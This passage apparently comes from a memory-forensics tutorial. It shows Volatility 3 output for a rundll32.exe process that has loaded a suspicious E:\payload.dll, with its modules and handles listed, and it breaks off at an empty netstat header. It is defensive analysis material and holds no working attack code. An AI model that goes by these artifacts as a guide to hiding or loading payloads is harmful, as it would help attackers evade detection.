3648    rundll32.exe    0x7ffaa11c0000  0x100000        ucrtbase.dll    C:\Windows\System32\ucrtbase.dll        2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa1820000  0x126000        RPCRT4.dll      C:\Windows\System32\RPCRT4.dll  2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa3530000  0xad000 shcore.dll      C:\Windows\System32\shcore.dll  2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2b70000  0x1d000 imagehlp.dll    C:\Windows\System32\imagehlp.dll        2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x6bac0000      0x4f000 payload.dll     E:\payload.dll  2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2750000  0x19d000        user32.dll      C:\Windows\System32\user32.dll  2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa14a0000  0x22000 win32u.dll      C:\Windows\System32\win32u.dll  2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2900000  0x2c000 GDI32.dll       C:\Windows\System32\GDI32.dll   2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa1330000  0x115000        gdi32full.dll   C:\Windows\System32\gdi32full.dll       2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa0e20000  0x9d000 msvcp_win.dll   C:\Windows\System32\msvcp_win.dll       2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2b40000  0x30000 IMM32.DLL       C:\Windows\System32\IMM32.DLL   2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffa9e7a0000  0x9e000 uxtheme.dll     C:\Windows\system32\uxtheme.dll 2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2b90000  0x114000        MSCTF.dll       C:\Windows\System32\MSCTF.dll   2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2d10000  0xcd000 OLEAUT32.dll    C:\Windows\System32\OLEAUT32.dll        2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2360000  0x9c000 sechost.dll     C:\Windows\System32\sechost.dll 2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa1770000  0xaf000 ADVAPI32.dll    C:\Windows\System32\ADVAPI32.dll        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa959c0000  0x4d9000        WININET.dll     C:\Windows\System32\WININET.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa2630000  0x6b000 WS2_32.dll      C:\Windows\System32\WS2_32.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0660000  0x18000 CRYPTSP.dll     C:\Windows\System32\CRYPTSP.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa9fd90000  0x34000 rsaenh.dll      C:\Windows\system32\rsaenh.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa14d0000  0x27000 bcrypt.dll      C:\Windows\System32\bcrypt.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0680000  0xc000  CRYPTBASE.dll   C:\Windows\System32\CRYPTBASE.dll       2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0d90000  0x82000 bcryptPrimitives.dll    C:\Windows\System32\bcryptPrimitives.dll
        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0c80000  0x32000 SspiCli.dll     C:\Windows\System32\SspiCli.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa908e0000  0x17000 napinsp.dll     C:\Windows\system32\napinsp.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa8ffe0000  0x1b000 pnrpnsp.dll     C:\Windows\system32\pnrpnsp.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa8b4b0000  0x15000 wshbth.dll      C:\Windows\system32\wshbth.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa9c740000  0x1d000 NLAapi.dll      C:\Windows\system32\NLAapi.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0160000  0x3c000 IPHLPAPI.DLL    C:\Windows\System32\IPHLPAPI.DLL        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0470000  0x6a000 mswsock.dll     C:\Windows\System32\mswsock.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa01a0000  0xcb000 DNSAPI.dll      C:\Windows\SYSTEM32\DNSAPI.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa28f0000  0x8000  NSI.dll C:\Windows\System32\NSI.dll     2023-08-10 09:15:15.000000
        Disabled
3648    rundll32.exe    0x7ffa8ffc0000  0x12000 winrnr.dll      C:\Windows\System32\winrnr.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa99300000  0x82000 fwpuclnt.dll    C:\Windows\System32\fwpuclnt.dll        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa993f0000  0xa000  rasadhlp.dll    C:\Windows\System32\rasadhlp.dll        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa970d0000  0x2b1000        iertutil.dll    C:\Windows\System32\iertutil.dll        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa9ee70000  0x793000        windows.storage.dll     C:\Windows\SYSTEM32\windows.storage.dll
        2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0710000  0x2e000 Wldp.dll        C:\Windows\System32\Wldp.dll    2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa1710000  0x55000 shlwapi.dll     C:\Windows\System32\shlwapi.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffaa0cd0000  0x1f000 profapi.dll     C:\Windows\System32\profapi.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa86730000  0x17000 ondemandconnroutehelper.dll     C:\Windows\SYSTEM32\ondemandconnroutehelper.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa99bd0000  0x10a000        winhttp.dll     C:\Windows\SYSTEM32\winhttp.dll 2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa9ec70000  0x12000 kernel.appcore.dll      C:\Windows\SYSTEM32\kernel.appcore.dll  2023-08-10 09:15:15.000000      Disabled
3648    rundll32.exe    0x7ffa9a9a0000  0xb000  WINNSI.DLL      C:\Windows\SYSTEM32\WINNSI.DLL  2023-08-10 09:15:15.000000      Disabled
```

#### Identifying Handles

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.handles --pid 3648
Volatility 3 Framework 2.5.0

PID     Process Offset  HandleValue     Type    GrantedAccess   Name

3648    rundll32.exe    0x800ae4d88960  0x4     Event   0x1f0003
3648    rundll32.exe    0x800ae4d909e0  0x8     Event   0x1f0003
3648    rundll32.exe    0x800ae1da6df0  0xc     WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae40b1140  0x10    IoCompletion    0x1f0003
3648    rundll32.exe    0x800ae139dd70  0x14    TpWorkerFactory 0xf00ff
3648    rundll32.exe    0x800ae0cd4e90  0x18    IRTimer 0x100002
3648    rundll32.exe    0x800ae1da8240  0x1c    WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae0cd5600  0x20    IRTimer 0x100002
3648    rundll32.exe    0x800ae1da83e0  0x24    WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae40b8830  0x28    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40b97f0  0x2c    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ba350  0x30    EtwRegistration 0x804
3648    rundll32.exe    0xdf8539094560  0x34    Directory       0x3     KnownDlls
3648    rundll32.exe    0x800ae4d90560  0x38    Event   0x1f0003
3648    rundll32.exe    0x800ae4d905e0  0x3c    Event   0x1f0003
3648    rundll32.exe    0x800ae17c3080  0x40    Thread  0x1fffff        Tid 2228 Pid 3648
3648    rundll32.exe    0x800ae40bfbb0  0x44    EtwRegistration 0x804
3648    rundll32.exe    0x800ae1d3d450  0x48    Mutant  0x1f0001        SM0:3648:304:WilStaging_02
3648    rundll32.exe    0x800ae4a097a0  0x4c    ALPC Port       0x1f0001
3648    rundll32.exe    0xdf853943d920  0x50    Directory       0xf     BaseNamedObjects
3648    rundll32.exe    0x800ae05465e0  0x54    Semaphore       0x1f0003        SM0:3648:304:WilStaging_02_p0
3648    rundll32.exe    0x800ae0546680  0x58    Semaphore       0x1f0003        SM0:3648:304:WilStaging_02_p0h
3648    rundll32.exe    0x800ae40c1430  0x5c    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40c25b0  0x60    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40c2cb0  0x64    EtwRegistration 0x804
3648    rundll32.exe    0x800ae0cd7d50  0x68    IRTimer 0x100002
3648    rundll32.exe    0x800ae2959d10  0x6c    TpWorkerFactory 0xf00ff
3648    rundll32.exe    0x800ae40c3f00  0x70    IoCompletion    0x1f0003
3648    rundll32.exe    0x800ae1da84b0  0x74    WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae0cd7b30  0x78    IRTimer 0x100002
3648    rundll32.exe    0x800ae1da7c90  0x7c    WaitCompletionPacket    0x1
3648    rundll32.exe    0xdf8541a03a90  0x80    Key     0x20019 MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS
3648    rundll32.exe    0xdf8541a13330  0x84    Key     0x20019 MACHINE
3648    rundll32.exe    0x800ae4d91b60  0x88    Event   0x1f0003
3648    rundll32.exe    0x800ae1da8720  0x8c    WaitCompletionPacket    0x1
3648    rundll32.exe    0xdf8541a07d80  0x90    Key     0x20019 MACHINE
3648    rundll32.exe    0xdf8541a07b60  0x94    Key     0x20019 MACHINE\SOFTWARE\MICROSOFT\OLE
3648    rundll32.exe    0x800ae4d91960  0x98    Event   0x1f0003
3648    rundll32.exe    0xdf8541a12890  0xa0    Partition       0x20019
3648    rundll32.exe    0x800ae4d919e0  0xa4    Event   0x1f0003
3648    rundll32.exe    0x800ae40c4610  0xa8    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40c4a70  0xac    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40c9150  0xb0    EtwRegistration 0x804
3648    rundll32.exe    0x800ae4d91be0  0xb4    Event   0x1f0003
3648    rundll32.exe    0x800ae4d91560  0xb8    Event   0x1f0003
3648    rundll32.exe    0x800ae4d91ee0  0xbc    Event   0x1f0003
3648    rundll32.exe    0x800ae4d91c60  0xc0    Event   0x1f0003
3648    rundll32.exe    0x800ae4d91660  0xc4    Event   0x1f0003
3648    rundll32.exe    0x800ae4d915e0  0xc8    Event   0x1f0003
3648    rundll32.exe    0x800ae40caab0  0xcc    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cab90  0xd0    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40caf10  0xd4    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ccdb0  0xd8    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cca30  0xdc    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cd830  0xe0    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cd9f0  0xe4    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cdbb0  0xe8    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cc790  0xec    EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a0a1a0  0xf0    Key     0x1     MACHINE\SYSTEM\CONTROLSET001\CONTROL\SESSION MANAGER
3648    rundll32.exe    0x800ae1347080  0xf4    Thread  0x1fffff        Tid 5528 Pid 3648
3648    rundll32.exe    0x800ae40cc5d0  0xf8    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cdc90  0xfc    EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cd2f0  0x100   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a09b40  0x104   Key     0x9     MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS
3648    rundll32.exe    0x800ae40cc242  0x10c   Session 0x1f0003
3648    rundll32.exe    0x800adf624d20  0x110   WindowStation   0xf037f WinSta0
3648    rundll32.exe    0x800adf5fda80  0x114   Desktop 0xf01ff Default
3648    rundll32.exe    0x800adf624d20  0x118   WindowStation   0xf037f WinSta0
3648    rundll32.exe    0x800ae2f02770  0x11c   File    0x100001        \Device\HarddiskVolume3\Windows\System32\en-US\rundll32.exe.mui
3648    rundll32.exe    0x800ae40cd130  0x120   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cc410  0x128   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cc4f0  0x12c   EtwRegistration 0x804
3648    rundll32.exe    0x800adf453080  0x130   Thread  0x1fffff        Tid 792 Pid 3648
3648    rundll32.exe    0x800ae40cc330  0x134   EtwRegistration 0x804
3648    rundll32.exe    0x800ae137dce0  0x138   ALPC Port       0x1f0001
3648    rundll32.exe    0x800ae40cc6b0  0x13c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cc870  0x140   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cc950  0x144   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cd210  0x148   EtwRegistration 0x804
3648    rundll32.exe    0x800ae190c080  0x14c   Thread  0x1fffff        Tid 2156 Pid 3648
3648    rundll32.exe    0x800ae40ccb10  0x150   EtwRegistration 0x804
3648    rundll32.exe    0xdf85394d8830  0x154   Section 0x4     Theme2077877619
3648    rundll32.exe    0xdf85394d82f0  0x158   Section 0x4     Theme578244626
3648    rundll32.exe    0x800ae40cf5f0  0x15c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce470  0x160   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cf7b0  0x164   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ceb70  0x168   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce550  0x16c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ced30  0x170   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a05960  0x174   Key     0xf     USER\S-1-5-21-414731039-2985344906-4266326170-1000\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\INTERNET SETTINGS\5.0\CACHE\EXTENSIBLE CACHE
3648    rundll32.exe    0x800ae40cf350  0x178   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce8d0  0x17c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cdf30  0x180   EtwRegistration 0x804
3648    rundll32.exe    0x800ae1e1d6e0  0x184   Semaphore       0x100003
3648    rundll32.exe    0x800ae1e1df60  0x188   Semaphore       0x100003
3648    rundll32.exe    0x800ae1e1dde0  0x18c   Event   0x1f0003
3648    rundll32.exe    0x800ae4439c70  0x190   File    0x100003        \Device\KsecDD
3648    rundll32.exe    0x800ae40ce390  0x194   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce0f0  0x198   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a0d280  0x19c   Key     0x20019 MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\IDS
3648    rundll32.exe    0x800ae2f03470  0x1a0   File    0x100001        \Device\KsecDD
3648    rundll32.exe    0x800ae40cec50  0x1a4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce1d0  0x1a8   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce710  0x1ac   EtwRegistration 0x804
3648    rundll32.exe    0x800ae460acd0  0x1b0   File    0x100001        \Device\CNG
3648    rundll32.exe    0x800ae40cde50  0x1b4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae1e1d860  0x1b8   Semaphore       0x100003
3648    rundll32.exe    0x800ae1e1de60  0x1bc   Semaphore       0x100003
3648    rundll32.exe    0x800ae1e1d560  0x1c0   Event   0x1f0003
3648    rundll32.exe    0x800ae40ce2b0  0x1c4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cf430  0x1c8   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cf6d0  0x1cc   EtwRegistration 0x804
3648    rundll32.exe    0x800ae1e1e160  0x1d0   Event   0x1f0003
3648    rundll32.exe    0x800ae190c080  0x1d4   Thread  0x1fffff        Tid 2156 Pid 3648
3648    rundll32.exe    0x800ae18dbce0  0x1d8   ALPC Port       0x1f0001
3648    rundll32.exe    0x800ae190c080  0x1dc   Thread  0x1fffff        Tid 2156 Pid 3648
3648    rundll32.exe    0x800ae1e1d1e0  0x1e0   Event   0x1f0003
3648    rundll32.exe    0xdf8541a109c0  0x1e4   Key     0x20019 MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\PROTOCOL_CATALOG9
3648    rundll32.exe    0x800ae1e1fee0  0x1e8   Event   0x1f0003
3648    rundll32.exe    0x800ae40cee10  0x1f0   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce630  0x1f4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae1e1f7e0  0x1f8   Event   0x1f0003
3648    rundll32.exe    0x800ae1e1ffe0  0x1fc   Event   0x1f0003
3648    rundll32.exe    0x800ae1e20160  0x200   Event   0x1f0003
3648    rundll32.exe    0x800ae40cf0b0  0x204   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40ce9b0  0x208   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cea90  0x20c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cfcf0  0x210   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1110  0x214   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d11f0  0x218   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d0690  0x21c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40cfb30  0x220   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d0a10  0x224   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d13b0  0x228   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d0af0  0x22c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d0150  0x230   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d0bd0  0x234   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1e30  0x238   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2d10  0x23c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae0cbe460  0x244   Event   0x1f0003
3648    rundll32.exe    0x800ae40d3090  0x248   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1d50  0x24c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2df0  0x250   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2450  0x254   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1f10  0x258   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2c30  0x25c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae0cc79e0  0x260   Event   0x1f0003
3648    rundll32.exe    0x800ae40d19d0  0x264   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2990  0x268   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2370  0x26c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d27d0  0x270   EtwRegistration 0x804
3648    rundll32.exe    0x800ae11c3560  0x274   Event   0x1f0003
3648    rundll32.exe    0x800ae4775750  0x278   File    0x100080        \Device\Nsi
3648    rundll32.exe    0xdf853f263410  0x27c   Key     0x20019 MACHINE\SYSTEM\CONTROLSET001\SERVICES\TCPIP\PARAMETERS\INTERFACES
3648    rundll32.exe    0xdf853f267e70  0x280   Key     0x20019 MACHINE\SYSTEM\CONTROLSET001\SERVICES\TCPIP6\PARAMETERS\INTERFACES
3648    rundll32.exe    0x800ae40d2290  0x284   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d21b0  0x288   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d20d0  0x28c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2ed0  0x290   EtwRegistration 0x804
3648    rundll32.exe    0x800ae4d8bc60  0x294   Semaphore       0x1f0003
3648    rundll32.exe    0x800ae4a9bdc0  0x298   ALPC Port       0x1f0001
3648    rundll32.exe    0xdf8541a03650  0x29c   Key     0xf     USER\S-1-5-21-414731039-2985344906-4266326170-1000\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\INTERNET SETTINGS\5.0\CACHE
3648    rundll32.exe    0x800ae40d2a70  0x2a0   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d2530  0x2a4   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a06b70  0x2a8   Key     0xf003f USER\S-1-5-21-414731039-2985344906-4266326170-1000
3648    rundll32.exe    0xdf8541a08820  0x2ac   Key     0x20019 USER\S-1-5-21-414731039-2985344906-4266326170-1000\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\INTERNET SETTINGS
3648    rundll32.exe    0xdf8541a0db00  0x2b0   Key     0x20019 MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\INTERNET SETTINGS\5.0\CACHE
3648    rundll32.exe    0x800ae40d2b50  0x2b4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3170  0x2b8   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d26f0  0x2bc   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1650  0x2c0   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1730  0x2c4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d1810  0x2c8   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d18f0  0x2cc   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d28b0  0x2d0   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d4670  0x2d4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d4c90  0x2d8   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3f70  0x2dc   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3bf0  0x2e0   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3b10  0x2e4   EtwRegistration 0x804
3648    rundll32.exe    0xdf853b7129a0  0x2e8   Section 0x6
3648    rundll32.exe    0x800ae40d3950  0x2ec   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a080b0  0x2f0   Key     0x1     USER\S-1-5-21-414731039-2985344906-4266326170-1000\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER
3648    rundll32.exe    0x800ae40d4750  0x2f4   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3790  0x2f8   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d4210  0x2fc   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d49f0  0x300   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d42f0  0x304   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d43d0  0x308   EtwRegistration 0x804
3648    rundll32.exe    0x800ae1b08910  0x310   ALPC Port       0x1f0001
3648    rundll32.exe    0x800ae40d4ad0  0x314   EtwRegistration 0x804
3648    rundll32.exe    0xdf853c84b220  0x318   Section 0x2     windows_webcache_counters_{9B6AB5B3-91BC-4097-835C-EA2DEC95E9CC}_S-1-5-21-414731039-2985344906-4266326170-1000
3648    rundll32.exe    0x800ae40d44b0  0x31c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3cd0  0x320   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d4d70  0x324   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3870  0x328   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d4590  0x32c   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a12ef0  0x330   TmTx    0x20019
3648    rundll32.exe    0xdf8541a12120  0x334   PcwObject       0x1
3648    rundll32.exe    0xdf8541a12cd0  0x344   DxgkCurrentDxgThreadObject      0x20019
3648    rundll32.exe    0x800ae40d4830  0x358   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3250  0x35c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3db0  0x360   EtwRegistration 0x804
3648    rundll32.exe    0x800ae4d90fe0  0x364   Event   0x1f0003
3648    rundll32.exe    0x800ae1db7120  0x368   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae4d90360  0x380   Event   0x1f0003
3648    rundll32.exe    0x800ae1db8160  0x384   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae40d3410  0x388   EtwRegistration 0x804
3648    rundll32.exe    0x800ae16e8080  0x38c   Thread  0x1fffff        Tid 7860 Pid 3648
3648    rundll32.exe    0x800ae40d35d0  0x394   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d34f0  0x398   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d3a30  0x39c   EtwRegistration 0x804
3648    rundll32.exe    0x800ae40d5e10  0x3a0   EtwRegistration 0x804
3648    rundll32.exe    0x800ae4d91d60  0x3a4   Event   0x1f0003
3648    rundll32.exe    0xdf8541a0ed10  0x3a8   Key     0x20019 MACHINE\SOFTWARE\POLICIES\MICROSOFT\WINDOWS
3648    rundll32.exe    0x800ae1db9ea0  0x3b8   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae4d92160  0x3bc   Event   0x1f0003
3648    rundll32.exe    0x800ae1dbad40  0x3c0   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae48117d0  0x3c8   Mutant  0x1f0001        SM0:3648:120:WilError_03
3648    rundll32.exe    0x800ae4db9950  0x3cc   Semaphore       0x1f0003        SM0:3648:120:WilError_03_p0
3648    rundll32.exe    0x800ae40d6180  0x3d0   IoCompletion    0x1f0003
3648    rundll32.exe    0xdf8541a150f0  0x3d4   Key     0x10    MACHINE\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\TENANTRESTRICTIONS\PAYLOAD
3648    rundll32.exe    0xdf8541a13660  0x3e4   Key     0x10    MACHINE\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\TENANTRESTRICTIONS\PAYLOAD
3648    rundll32.exe    0x800ae09d1570  0x3e8   ALPC Port       0x1f0001
3648    rundll32.exe    0x800ae4d92260  0x3f4   Event   0x1f0003
3648    rundll32.exe    0x800ae4d930e0  0x3f8   Event   0x1f0003
3648    rundll32.exe    0x800ae4d921e0  0x3fc   Event   0x1f0003
3648    rundll32.exe    0x800ae1dbb150  0x404   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae4d92960  0x408   Event   0x1f0003
3648    rundll32.exe    0x800ae1dbc740  0x40c   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae4d93c60  0x410   Event   0x1f0003
3648    rundll32.exe    0x800ae4d948e0  0x414   Event   0x1f0003
3648    rundll32.exe    0x800ae4d92a60  0x418   Event   0x1f0003
3648    rundll32.exe    0x800ae4d92360  0x41c   Event   0x1f0003
3648    rundll32.exe    0x800ae4d92ae0  0x420   Event   0x1f0003
3648    rundll32.exe    0x800ae1dbf0b0  0x424   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae4d94460  0x428   Event   0x1f0003
3648    rundll32.exe    0x800ae1dbdc60  0x42c   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae4d943e0  0x430   Event   0x1f0003
3648    rundll32.exe    0x800ae4d94d60  0x434   Event   0x1f0003
3648    rundll32.exe    0x800ae4d94de0  0x438   Event   0x1f0003
3648    rundll32.exe    0x800ae1dc0ab0  0x43c   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae04e1cb0  0x440   TpWorkerFactory 0xf00ff
3648    rundll32.exe    0x800ae12de4b0  0x444   IRTimer 0x100002
3648    rundll32.exe    0x800ae1dc0500  0x448   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae12df390  0x44c   IRTimer 0x100002
3648    rundll32.exe    0x800ae1dbf660  0x450   WaitCompletionPacket    0x1
3648    rundll32.exe    0x800ae23b4a60  0x458   ALPC Port       0x1f0001
3648    rundll32.exe    0x800ae0578070  0x468   ALPC Port       0x1f0001
3648    rundll32.exe    0x800ae4dbb890  0x46c   Semaphore       0x1f0003        SM0:3648:120:WilError_03_p0h
3648    rundll32.exe    0x800ae4439e10  0x474   File    0x100001        \Device\HarddiskVolume3\Windows\System32\en-US\mswsock.dll.mui
3648    rundll32.exe    0x800ae22d1f60  0x480   Event   0x1f0003
3648    rundll32.exe    0x800ae476a630  0x484   File    0x120089        \Device\NamedPipe\
3648    rundll32.exe    0xdf853c619a50  0x488   Section 0x4
3648    rundll32.exe    0x800ae1858860  0x48c   Event   0x1f0003
3648    rundll32.exe    0x800ae1063910  0x494   EtwRegistration 0x804
3648    rundll32.exe    0xdf8541a0b4c0  0x498   Key     0x8     USER\S-1-5-21-414731039-2985344906-4266326170-1000\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION
3648    rundll32.exe    0x800ae0235080  0x574   Thread  0x1fffff        Tid 1748 Pid 3648
3648    rundll32.exe    0x800ae44dbc70  0x5b4   File    0x100020        \Device\HarddiskVolume3\Users\johndoe\Desktop
```

#### Identifying Network Artifacts

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.netstat
Volatility 3 Framework 2.5.0

Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

